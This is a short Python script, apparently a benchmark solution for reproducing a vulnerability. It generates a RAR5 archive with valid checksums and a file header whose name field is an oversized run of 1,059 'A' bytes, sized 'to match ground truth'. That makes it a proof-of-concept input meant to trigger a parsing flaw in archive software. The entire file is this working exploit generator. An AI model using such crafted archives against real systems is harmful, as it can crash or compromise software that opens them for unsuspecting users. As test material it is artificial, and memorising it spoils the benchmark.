import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
        
        def to_vint(v):
            if v == 0:
                return b'\x00'
            out = bytearray()
            while v > 0:
                part = v & 0x7F
                v >>= 7
                if v > 0:
                    out.append(part | 0x80)
                else:
                    out.append(part)
            return bytes(out)

        def get_crc(b):
            return struct.pack("<I", binascii.crc32(b) & 0xFFFFFFFF)

        # Main Header (Type 1)
        # Structure: CRC(4) | Size(VINT) | Type(VINT) | Flags(VINT)
        # Body starts at Type.
        mh_type = to_vint(1)
        mh_flags = to_vint(0)
        mh_body = mh_type + mh_flags
        mh_size = to_vint(len(mh_body))
        mh_crc = get_crc(mh_body)
        
        main_header = mh_crc + mh_size + mh_body

        # File Header (Type 2)
        # We target a total length of 1089 bytes to match ground truth.
        # Signature (8) + Main Header (7) = 15 bytes.
        # Remaining: 1074 bytes for the File Header.
        
        # File Header Structure:
        # CRC(4) + Size(VINT) + GenericBody
        # GenericBody: Type(VINT) + Flags(VINT) + SpecificBody
        # SpecificBody: FileFlags(VINT) + UnpSize(VINT) + Attr(VINT) + Comp(VINT) + OS(VINT) + NameLen(VINT) + Name(N)
        
        # Approximate overhead calculation:
        # CRC(4) + Size(2) + Type(1) + Flags(1) = 8 bytes generic overhead.
        # Specific fields:
        # FileFlags(1) + UnpSize(1) + Attr(1) + Comp(1) + OS(1) + NameLen(2) = 7 bytes.
        # Total overhead ~ 15 bytes.
        # 1074 - 15 = 1059 bytes for name.
        
        name_len = 1059
        name = b"A" * name_len
        
        fh_type = to_vint(2)
        fh_flags = to_vint(0) # Generic flags
        
        fh_file_flags = to_vint(0)
        fh_unp_size = to_vint(0)
        fh_attr = to_vint(0)
        fh_comp = to_vint(0)
        fh_os = to_vint(0)
        fh_name_len = to_vint(name_len)
        
        fh_specific = fh_file_flags + fh_unp_size + fh_attr + fh_comp + fh_os + fh_name_len + name
        fh_body = fh_type + fh_flags + fh_specific
        
        fh_size = to_vint(len(fh_body))
        fh_crc = get_crc(fh_body)
        
        file_header = fh_crc + fh_size + fh_body
        
        return sig + main_header + file_header